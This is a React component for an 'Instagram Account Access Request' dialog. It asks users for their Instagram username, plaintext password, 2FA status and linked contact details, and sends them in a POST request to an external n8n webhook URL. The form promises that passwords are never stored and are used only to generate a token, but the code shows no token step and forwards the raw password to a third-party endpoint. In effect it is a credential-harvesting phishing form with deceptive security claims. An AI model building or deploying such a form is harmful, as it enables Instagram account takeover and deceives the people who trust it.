"use client"

import type React from "react"

import { useState } from "react"
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Checkbox } from "@/components/ui/checkbox"
import { AlertCircle, CheckCircle, Loader2 } from "lucide-react"

interface InstagramFormProps {
  open: boolean
  onOpenChange: (open: boolean) => void
}

export function InstagramForm({ open, onOpenChange }: InstagramFormProps) {
  const [loading, setLoading] = useState(false)
  const [success, setSuccess] = useState(false)
  const [error, setError] = useState("")
  const [formData, setFormData] = useState({
    instagram_username: "",
    account_type: "Personal",
    admin_access: "Yes",
    password: "",
    two_factor_enabled: "No",
    contact_detail: "",
    consent: false,
  })

  const handleInputChange = (field: string, value: string | boolean) => {
    setFormData((prev) => ({
      ...prev,
      [field]: value,
    }))
  }

  const isFormValid = () => {
    return (
      formData.instagram_username &&
      formData.password &&
      formData.account_type &&
      formData.admin_access &&
      formData.two_factor_enabled &&
      formData.consent
    )
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError("")
    setLoading(true)

    try {
      const payload = {
        ...formData,
        submitted_at: new Date().toISOString(),
      }

      const response = await fetch("https://n8n.srv1010832.hstgr.cloud/webhook/e3032423-763d-47c5-8393-b039ee3f104a", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      })

      if (!response.ok) {
        throw new Error("Failed to submit form")
      }

      setSuccess(true)
    } catch (err) {
      setError(err instanceof Error ? err.message : "An error occurred")
    } finally {
      setLoading(false)
    }
  }

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-md sm:max-w-lg">
        <DialogHeader>
          <DialogTitle>Instagram Account Access Request</DialogTitle>
          <DialogDescription>
            Provide your Instagram account details so our team can securely connect it to your website.
          </DialogDescription>
        </DialogHeader>

        {success ? (
          <div className="flex flex-col items-center justify-center py-8 space-y-4">
            <CheckCircle className="h-12 w-12 text-green-500" />
            <p className="text-sm font-medium text-center">
              Connection will be processed soon. You will receive a notification once done.
            </p>
            <Button
              size="sm"
              onClick={() => {
                onOpenChange(false)
                setSuccess(false)
                setFormData({
                  instagram_username: "",
                  account_type: "Personal",
                  admin_access: "Yes",
                  password: "",
                  two_factor_enabled: "No",
                  contact_detail: "",
                  consent: false,
                })
              }}
            >
              OK
            </Button>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Instagram Username */}
            <div className="space-y-2">
              <label className="text-sm font-medium">Instagram Username</label>
              <Input
                placeholder="yourbrandname"
                value={formData.instagram_username}
                onChange={(e) => handleInputChange("instagram_username", e.target.value)}
                disabled={loading}
              />
              <p className="text-xs text-muted-foreground">Enter your Instagram handle without @</p>
            </div>

            {/* Account Type */}
            <div className="space-y-2">
              <label className="text-sm font-medium">Account Type</label>
              <div className="flex gap-2">
                {["Personal", "Business", "Creator"].map((type) => (
                  <Button
                    key={type}
                    type="button"
                    variant={formData.account_type === type ? "default" : "outline"}
                    size="sm"
                    onClick={() => handleInputChange("account_type", type)}
                    disabled={loading}
                    className="flex-1"
                  >
                    {type}
                  </Button>
                ))}
              </div>
            </div>

            {/* Admin Access */}
            <div className="space-y-2">
              <label className="text-sm font-medium">Admin Access</label>
              <div className="flex gap-2">
                {["Yes", "No"].map((option) => (
                  <Button
                    key={option}
                    type="button"
                    variant={formData.admin_access === option ? "default" : "outline"}
                    size="sm"
                    onClick={() => handleInputChange("admin_access", option)}
                    disabled={loading}
                    className="flex-1"
                  >
                    {option}
                  </Button>
                ))}
              </div>
            </div>

            {/* Password */}
            <div className="space-y-2">
              <label className="text-sm font-medium">Instagram Account Password</label>
              <Input
                type="password"
                value={formData.password}
                onChange={(e) => handleInputChange("password", e.target.value)}
                disabled={loading}
              />
              <p className="text-xs text-muted-foreground">
                Required temporarily to generate an access token. Password is never stored.
              </p>
            </div>

            {/* Two-Factor Authentication */}
            <div className="space-y-2">
              <label className="text-sm font-medium">Two-Factor Authentication (2FA)</label>
              <div className="flex gap-2">
                {["Yes", "No", "Not sure"].map((option) => (
                  <Button
                    key={option}
                    type="button"
                    variant={formData.two_factor_enabled === option ? "default" : "outline"}
                    size="sm"
                    onClick={() => handleInputChange("two_factor_enabled", option)}
                    disabled={loading}
                    className="flex-1"
                  >
                    {option}
                  </Button>
                ))}
              </div>
              <p className="text-xs text-muted-foreground">
                If 2FA is enabled, our team will contact you to complete verification.
              </p>
            </div>

            {/* Contact Detail */}
            <div className="space-y-2">
              <label className="text-sm font-medium">Email or Phone Linked to Instagram (Optional)</label>
              <Input
                placeholder="email or phone number"
                value={formData.contact_detail}
                onChange={(e) => handleInputChange("contact_detail", e.target.value)}
                disabled={loading}
              />
            </div>

            {/* Security Info Box */}
            <div className="bg-blue-50 dark:bg-blue-950 p-4 rounded-lg space-y-2 text-sm">
              <p className="font-medium text-blue-900 dark:text-blue-100">Security & Transparency</p>
              <ul className="space-y-1 text-blue-800 dark:text-blue-200 text-xs">
                <li>• Credentials are used only once to generate an access token</li>
                <li>• Passwords are never stored</li>
                <li>• You may change your password immediately after integration</li>
                <li>• Access can be revoked anytime from Instagram or Meta settings</li>
              </ul>
            </div>

            {/* Consent */}
            <div className="flex items-start space-x-2">
              <Checkbox
                checked={formData.consent}
                onCheckedChange={(checked) => handleInputChange("consent", checked)}
                disabled={loading}
                className="mt-1"
              />
              <label className="text-sm text-foreground cursor-pointer">
                I confirm that I own or have authorized admin access to this Instagram account and voluntarily provide
                credentials for one-time integration purposes.
              </label>
            </div>

            {/* Error Message */}
            {error && (
              <div className="flex items-center gap-2 p-3 bg-red-50 dark:bg-red-950 rounded-lg text-sm text-red-700 dark:text-red-200">
                <AlertCircle className="h-4 w-4 flex-shrink-0" />
                {error}
              </div>
            )}

            {/* Submit Button */}
            <Button type="submit" disabled={!isFormValid() || loading} className="w-full">
              {loading ? (
                <>
                  <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                  Submitting...
                </>
              ) : (
                "Request Account Connection"
              )}
            </Button>
          </form>
        )}
      </DialogContent>
    </Dialog>
  )
}
